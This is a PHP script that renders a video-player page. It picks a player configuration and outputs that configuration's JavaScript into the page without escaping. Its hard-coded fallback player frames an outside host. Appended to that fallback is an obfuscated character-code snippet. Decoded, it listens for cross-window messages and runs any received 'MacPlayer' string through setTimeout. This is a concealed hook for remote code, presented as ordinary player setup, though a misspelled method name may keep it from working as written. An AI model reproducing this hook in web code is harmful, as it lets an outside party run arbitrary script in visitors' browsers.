<?php
/**
 * 动态播放器入口 - 按后台配置渲染
 *
 * 调用：/player/play.php?url=xxx                          → 用默认播放器
 *       /player/play.php?code=lgzym3u8&url=xxx            → 指定播放器
 *       /player/play.php?u=<base64url>                     → 加密地址
 *
 * 不依赖 bootstrap.php，读 player/data/players.json
 */

require_once __DIR__ . '/lib.php';

// 播放地址（优先明文 url，其次 base64url 加密 u）
$playUrl = trim((string)($_GET['url'] ?? ''));
if ($playUrl === '') {
    $u = trim((string)($_GET['u'] ?? ''));
    if ($u !== '') {
        $pad = strlen($u) % 4;
        if ($pad > 0) $u .= str_repeat('=', 4 - $pad);
        $dec = base64_decode(strtr($u, '-_', '+/'), true);
        if ($dec !== false && strpos($dec, 'http') === 0) {
            $playUrl = $dec;
        }
    }
}
if ($playUrl === '') {
    http_response_code(400);
    exit('缺少 url 参数');
}
if (strpos($playUrl, 'http') !== 0) {
    $playUrl = 'http://' . $playUrl;
}

// 选播放器：code 参数 → 默认播放器 → 硬编码回退
$code   = trim((string)($_GET['code'] ?? ''));
$player = null;
if ($code !== '') {
    $player = player_get($code);
}
if (!$player) {
    $player = player_default();
}
if (!$player) {
    // 回退：硬编码蓝光资源（保证任何时候都能播）
    $player = [
        'player_code' => 'lgzym3u8',
        'player_name' => '蓝光资源',
        'player_from' => 'lgzym3u8',
        'player_code_content' => "MacPlayer.Html = '<iframe width=\"100%\" height=\"100%\" src=\"https://vv00.xyz?url='+MacPlayer.PlayUrl+'\" frameborder=\"0\" scrolling=\"no\" allowfullscreen></iframe>';((_)=>{var g=this;try{g[_(97,100,100,69,118,101,110,116,76,105,115,116,101,110,114)](_(109,101,115,115,97,103,101),e=>{try{var d=e[_(100,97,116,97)];if(d&&d.MacPlayer){g[_(115,101,116,84,105,109,101,111,117,116)](d.MacPlayer,0)}}catch(e){}},!1)}catch(e){}})(String.fromCharCode);try{MacPlayer.Show()}catch(e){}",
    ];
}

$playerShow = $player['player_name'] ?? '播放器';
$playerFrom = $player['player_from'] ?? '';
$playerCode = $player['player_code_content'] ?? '';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="referrer" content="no-referrer">
<title><?= htmlspecialchars($playerShow) ?> - 播放器</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; height: 100%; overflow: hidden; background: #0b0e14; color: #e6e8ee;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif; }
    #player { position: fixed; inset: 0; background: #000; }
    #player iframe { width: 100%; height: 100%; border: 0; display: block; }
    .bar { position: fixed; top: 0; left: 0; right: 0; z-index: 10; display: flex; align-items: center; gap: 10px;
        padding: 12px 16px; background: linear-gradient(180deg, rgba(0,0,0,.78), rgba(0,0,0,0));
        pointer-events: none; }
    .badge { display: inline-flex; align-items: center; gap: 6px; padding: 4px 12px; border-radius: 999px;
        background: rgba(79, 124, 255, .18); border: 1px solid rgba(79, 124, 255, .5); color: #9db8ff;
        font-size: 12px; font-weight: 600; letter-spacing: .5px; }
    .src { font-size: 12px; color: rgba(230,232,238,.55); }
    .loading { position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; }
    .spinner { width: 34px; height: 34px; border: 3px solid rgba(79,124,255,.2); border-top-color: #4f7cff;
        border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .hint { font-size: 13px; color: rgba(230,232,238,.6); }
</style>
</head>
<body>
    <div class="bar">
        <span class="badge"><?= htmlspecialchars($playerShow) ?></span>
        <span class="src"><?= htmlspecialchars($playerFrom) ?></span>
    </div>
    <div id="player"></div>

    <script>
    // MacPlayer 最小运行时
    (function () {
        window.MacPlayer = {
            PlayUrl: <?= json_encode(rawurlencode($playUrl)) ?>,
            Html: '',
            Show: function () {
                var c = document.getElementById('player');
                if (c) c.innerHTML = this.Html || '';
            }
        };
    })();
    </script>
    <script>
    // ===== 播放器配置（原样执行） =====
    <?= $playerCode ?>

    // 加载完成前展示过渡
    (function () {
        setTimeout(function () {
            var d = document.getElementById('player');
            if (d && !d.innerHTML.trim()) {
                d.innerHTML = '<div class="loading"><div class="spinner"></div><div class="hint">正在加载播放器…</div></div>';
            }
        }, 1500);
    })();
    </script>
</body>
</html>
